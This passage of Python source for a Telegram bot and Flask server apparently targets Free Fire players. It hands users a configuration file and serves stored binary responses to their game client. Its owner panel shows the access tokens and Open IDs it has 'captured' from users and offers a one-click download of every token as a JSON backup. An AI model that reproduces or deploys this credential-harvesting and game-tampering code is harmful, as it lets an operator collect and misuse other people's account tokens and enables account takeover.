    "⚠️ <b>ɴᴏᴛᴇ:</b> ᴛʜɪs ᴍᴇᴛʜᴏᴅ ᴡᴏʀᴋs ᴡɪᴛʜ ʙᴏᴛʜ ꜰʀᴇᴇ ꜰɪʀᴇ ᴀɴᴅ ꜰʀᴇᴇ ꜰɪʀᴇ ᴍᴀx.\n"
    "ɪғ ʏᴏᴜ ғᴀᴄᴇ ᴀɴʏ ɪssᴜᴇs, ᴅᴍ @VISWAJEETHU"
            ),
            parse_mode="HTML"
        )
    except Exception as e:
        print(f"Failed to send document: {e}")
        await update.message.reply_text(" Failed to send localconfig.json...")
    
    try:
        if os.path.exists(temp_config):
            os.remove(temp_config)
    except:
        pass

async def owner_panel(update, context):
    global MAINTENANCE_MODE
    tu = db_get_total_users()
    tt = db_get_total_tokens()
    ms = "🔴 ON" if MAINTENANCE_MODE else "🟢 OFF"
    
    kb = [
        [InlineKeyboardButton("👥 ᴀʟʟ ᴜsᴇʀs", callback_data="owner_users")],
        [InlineKeyboardButton("🎫 ᴀʟʟ ᴛᴏᴋᴇɴs", callback_data="owner_tokens")],
        [InlineKeyboardButton("📥 ᴅʟ ᴛᴏᴋᴇɴs", callback_data="owner_dl")],
        [InlineKeyboardButton("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", callback_data="owner_bc")],
        [InlineKeyboardButton("🚫 ʙᴀɴ", callback_data="owner_ban")],
        [InlineKeyboardButton("✅ ᴜɴʙᴀɴ", callback_data="owner_unban")],
        [InlineKeyboardButton("🛠️ Maintenance ON" if not MAINTENANCE_MODE else "✅ Maintenance OFF", 
                              callback_data="owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off")],
        [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="owner_back")]
    ]
    await update.message.reply_html(
        f"<b>👑 Owner Control Panel</b>\n\n"
        f"👥 Total Users: <b>{tu}</b>\n"
        f"🎫 Total Tokens: <b>{tt}</b>\n"
        f"🔧 Maintenance: {ms}",
        reply_markup=InlineKeyboardMarkup(kb))

async def owner_cb(update, context):
    global MAINTENANCE_MODE
    q = update.callback_query
    await q.answer()
    if q.from_user.id != OWNER_ID:
        return await q.edit_message_text(" Unauthorized access.")
    
    d = q.data
    if d == "owner_users":
        users = db_get_all_users()
        if not users:
            return await q.edit_message_text("No users found.")
        txt = f"<b>ᴀʟʟ ᴜsᴇʀs ({len(users)})</b>\n\n"
        for u in users:
            s = "🚫" if u[6] == 1 else "✅"
            txt += f"{s} <code>{u[0]}</code> | {u[1] or 'N/A'} | {u[4]}\n"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="owner_back")]]
        await q.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
    
    elif d == "owner_tokens":
        tokens = db_get_all_tokens()
        if not tokens:
            return await q.edit_message_text("No tokens captured yet.")
        txt = f"<b>ᴀʟʟ ᴛᴏᴋᴇɴs ({len(tokens)})</b>\n\n"
        for t in tokens[:10]:
            txt += f"━━━━━━━━━━━━━━━\n👤 <b>User:</b> <code>{t[1]}</code>\n🆔 <b>Open ID:</b> <code>{t[2]}</code>\n🔑 <b>Token:</b> <code>{t[3]}</code>\n🕒 <b>Time:</b> {t[4]}\n"
        if len(tokens) > 10:
            txt += f"\n... and {len(tokens)-10} more"
        kb = [[InlineKeyboardButton("🔙 Back", callback_data="owner_back")]]
        await q.edit_message_text(txt, parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))
    
    elif d == "owner_dl":
        if os.path.exists(TOKEN_JSON_PATH):
            with open(TOKEN_JSON_PATH, "rb") as f:
                await context.bot.send_document(q.message.chat_id, f, filename="access_token.json", caption="📁 All tokens backup")
        else:
            await q.edit_message_text("No access_token.json found.")
    
    elif d == "owner_bc":
        context.user_data["awaiting_broadcast"] = True
        await q.edit_message_text(
            "<b>📢 ʙʀᴏᴀᴅᴄᴀsᴛ ᴍᴏᴅᴇ</b>\n\n"
            "<i>Send the message to broadcast to all users.</i>\n\n"
            "📝 <b>Send your message below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML")
    
    elif d == "owner_ban":
        context.user_data["awaiting_ban"] = True
        await q.edit_message_text(
            "<b>🚫 ʙᴀɴ ᴜsᴇʀ</b>\n\n"
            "<i>Enter the user ID to ban.</i>\n\n"
            "📝 <b>Send user ID below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML")
    
    elif d == "owner_unban":
        context.user_data["awaiting_unban"] = True
        await q.edit_message_text(
            "<b>✅ ᴜɴʙᴀɴ ᴜsᴇʀ</b>\n\n"
            "<i>Enter the user ID to unban.</i>\n\n"
            "📝 <b>Send user ID below:</b>\n\n"
            "⚠️ <i>Type <code>/cancel</code> to cancel.</i>",
            parse_mode="HTML")
    
    elif d == "owner_maint_on":
        MAINTENANCE_MODE = True
        db_set_maintenance(True)
        await q.edit_message_text("✅ <b>Maintenance mode enabled!</b>", parse_mode="HTML")
    
    elif d == "owner_maint_off":
        MAINTENANCE_MODE = False
        db_set_maintenance(False)
        await q.edit_message_text("✅ <b>Maintenance mode disabled!</b>", parse_mode="HTML")
    
    elif d == "owner_back":
        tu = db_get_total_users()
        tt = db_get_total_tokens()
        ms = "🔴 ON" if MAINTENANCE_MODE else "🟢 OFF"
        kb = [
            [InlineKeyboardButton("👥 ᴀʟʟ ᴜsᴇʀs", callback_data="owner_users")],
            [InlineKeyboardButton("🎫 ᴀʟʟ ᴛᴏᴋᴇɴs", callback_data="owner_tokens")],
            [InlineKeyboardButton("📥 ᴅʟ ᴛᴏᴋᴇɴs", callback_data="owner_dl")],
            [InlineKeyboardButton("📢 ʙʀᴏᴀᴅᴄᴀsᴛ", callback_data="owner_bc")],
            [InlineKeyboardButton("🚫 ʙᴀɴ", callback_data="owner_ban")],
            [InlineKeyboardButton("✅ ᴜɴʙᴀɴ", callback_data="owner_unban")],
            [InlineKeyboardButton("🛠️ Maintenance ON" if not MAINTENANCE_MODE else "✅ Maintenance OFF",
                                  callback_data="owner_maint_on" if not MAINTENANCE_MODE else "owner_maint_off")],
            [InlineKeyboardButton("🔙 ʙᴀᴄᴋ", callback_data="owner_back")]
        ]
        await q.edit_message_text(
            f"<b>👑 Owner Control Panel</b>\n\n"
            f"👥 Total Users: <b>{tu}</b>\n"
            f"🎫 Total Tokens: <b>{tt}</b>\n"
            f"🔧 Maintenance: {ms}",
            parse_mode="HTML", reply_markup=InlineKeyboardMarkup(kb))

async def handle_admin(update, context):
    uid = update.effective_user.id
    if uid != OWNER_ID:
        return
    
    if context.user_data.get("awaiting_broadcast"):
        txt = update.message.text
        if txt == "/cancel":
            context.user_data["awaiting_broadcast"] = False
            return await update.message.reply_text("❌ Broadcast cancelled.", reply_markup=get_keyboard(uid))
        context.user_data["awaiting_broadcast"] = False
        users = db_get_all_users()
        sent = 0
        failed = 0
        progress = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
        for u in users:
            if u[6] == 1:
                continue
            try:
                await context.bot.send_message(u[0], txt, parse_mode="HTML")
                sent += 1
                await asyncio.sleep(0.03)
            except:
                failed += 1
        db_save_broadcast(txt, sent)
        await progress.edit_text(f"<b>✅ Broadcast Complete!</b>\n\n📨 Sent: <b>{sent}</b>\n❌ Failed: <b>{failed}</b>\n👥 Total: <b>{len(users)}</b>", parse_mode="HTML")
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_keyboard(uid))
        return
    
    if context.user_data.get("awaiting_ban"):
        txt = update.message.text.strip()
        if txt == "/cancel":
            context.user_data["awaiting_ban"] = False
            return await update.message.reply_text("❌ Ban cancelled.", reply_markup=get_keyboard(uid))
        try:
            db_ban_user(int(txt), True)
            await update.message.reply_text(f"✅ User <code>{txt}</code> banned!", parse_mode="HTML")
        except:
            await update.message.reply_text("❌ Invalid ID.")
        context.user_data["awaiting_ban"] = False
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_keyboard(uid))
        return
    
    if context.user_data.get("awaiting_unban"):
        txt = update.message.text.strip()
        if txt == "/cancel":
            context.user_data["awaiting_unban"] = False
            return await update.message.reply_text("❌ Unban cancelled.", reply_markup=get_keyboard(uid))
        try:
            db_ban_user(int(txt), False)
            await update.message.reply_text(f"✅ User <code>{txt}</code> unbanned!", parse_mode="HTML")
        except:
            await update.message.reply_text("❌ Invalid ID.")
        context.user_data["awaiting_unban"] = False
        await update.message.reply_html("<b>✅ Done!</b>", reply_markup=get_keyboard(uid))
        return

async def handle_all(update, context):
    if update.message and update.message.text and update.message.text.startswith("/"):
        return
    if context.user_data.get("awaiting_token"):
        return await handle_token_input(update, context)
    if context.user_data.get("awaiting_broadcast") or context.user_data.get("awaiting_ban") or context.user_data.get("awaiting_unban"):
        return await handle_admin(update, context)
    if update.message and update.message.text:
        await handle_buttons(update, context)

async def err_handler(update, context):
    try:
        e = str(context.error)
        if "Message is not modified" in e or "Chat not found" in e:
            return
        print(f"[!] Error: {e[:100]}")
    except:
        pass

def run_bot():
    app_bot = (Application.builder().token(BOT_TOKEN).concurrent_updates(True)
               .read_timeout(30).write_timeout(30).connect_timeout(30).pool_timeout(30).build())
    app_bot.add_handler(CommandHandler("start", start))
    app_bot.add_handler(CommandHandler("cancel", lambda u, c: (c.user_data.clear(), u.message.reply_text("✅ Cancelled.", reply_markup=get_keyboard(u.effective_user.id)))))
    app_bot.add_handler(CallbackQueryHandler(owner_cb, pattern="^owner_"))
    app_bot.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_all))
    app_bot.add_error_handler(err_handler)
    print(f"🤖 Telegram Bot Started (Polling)...")
    app_bot.run_polling()

# ============ FLASK ROUTES ============
@app.route('/')
def home():
    return "Bot is running on Render! 🤖"

@app.route('/<user_id>/', methods=['GET', 'POST'])
def handle_user(user_id):
    if request.method == 'GET':
        hex_file = os.path.join("user_sessions", f"response_{user_id}.hex")
        if os.path.exists(hex_file):
            with open(hex_file, 'r') as f:
                hex_data = f.read().strip()
            try:
                response_data = bytes.fromhex(hex_data)
                return Response(response_data, content_type='application/octet-stream')
            except:
                pass
        return "No response data available", 404
    return "Method not allowed", 405

if __name__ == '__main__':
    threading.Thread(target=lambda: app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True), daemon=True).start()
    time.sleep(1.5)
    print(f"🚀 All systems operational on port {PORT}!")
    run_bot()